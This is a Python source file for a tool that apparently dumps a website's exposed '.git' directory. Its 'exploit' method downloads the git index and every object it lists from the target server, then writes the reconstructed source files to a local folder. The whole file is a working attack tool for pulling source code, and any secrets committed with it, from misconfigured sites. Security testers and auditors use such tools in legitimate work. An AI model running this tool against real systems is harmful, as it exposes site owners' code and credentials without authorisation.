# -*- coding: utf-8 -*-
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib import parse, request
import io
import logging
import sys

try:
    from parse import parse_blob, parse_index
except ModuleNotFoundError:
    from .parse import parse_blob, parse_index


class Scanner:
    def __init__(self, uri: str):
        self.workdir = Path('site')
        self.uri = self._check_uri(uri)
        print('Target:', self.uri)

    def _check_uri(self, uri):
        parsed = parse.urlparse(uri)
        self.workdir /= parsed.netloc
        if self.workdir.exists():
            option = input(f'Workdir `{self.workdir}` already exists: [o]verride/[Q]uit? ')
            option = option.strip().lower()
            if option != 'o':
                sys.exit(1)
        else:
            self.workdir.mkdir(parents=True)
        if not parsed.path.rstrip('/').endswith('.git'):
            uri = parse.urljoin(uri, '.git')
        return uri

    def _fetch(self, uri):
        req = request.Request(uri)
        res = request.urlopen(req)
        return res.read()

    def _save(self, filename, content):
        if not filename.parent.exists():
            filename.parent.mkdir(parents=True, exist_ok=True)
        filename.write_bytes(content)

    def _get_index(self):
        uri = self.uri + '/index'
        content = self._fetch(uri)
        return io.BytesIO(content)

    def _get_blob(self, name, sha1):
        uri = '/'.join([self.uri, 'objects', sha1[:2], sha1[2:]])
        content = self._fetch(uri)
        header, blob = parse_blob(content)
        filename = self.workdir / name
        self._save(filename, blob)
        return header.decode()

    def exploit(self):
        index_file = self._get_index()
        _parser = parse_index(index_file)
        total = next(_parser)
        print(f"Total: {total}")

        with ThreadPoolExecutor() as executor:
            futures = {executor.submit(self._get_blob, e.name, e.sha1): e.name for e in _parser}

        for future in as_completed(futures):
            e = futures[future]
            try:
                result = future.result()
            except Exception as exc:
                print(f'\x1b[31;1m[ERROR]\x1b[0m {e} : {repr(exc)}')
            else:
                print(f'\x1b[32m[OK]\x1b[0m {e} : {result}')
